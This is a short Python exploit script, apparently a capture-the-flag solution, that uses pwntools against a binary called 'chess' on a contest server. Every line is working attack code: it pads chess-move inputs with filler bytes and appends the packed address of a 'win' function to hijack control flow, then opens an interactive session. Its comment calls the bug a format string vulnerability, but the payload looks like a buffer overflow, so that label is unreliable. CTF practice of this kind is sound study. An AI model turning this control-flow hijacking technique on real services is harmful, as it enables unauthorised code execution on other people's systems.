#!/usr/bin/env python3

from pwn import *

exe = ELF("./chess")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("challenges.ctfd.io", 30458)


    pause()
    r.recv()
    r.sendline("1")

    r.recvline()

    # Format string vulnerability.
    win = 0x04011c2

    r.sendline(b"MAHER")
    

    r.recv()
    r.sendline(b"Ra1" + b" " + b"M"*(0x80-0x7))

    r.recv()
    r.sendline(b"Qg7")

    r.recv()

    r.sendline(b"Kd2"+ b" " + b"M"*0x55 + p64(win))

    r.interactive()


if __name__ == "__main__":
    main()
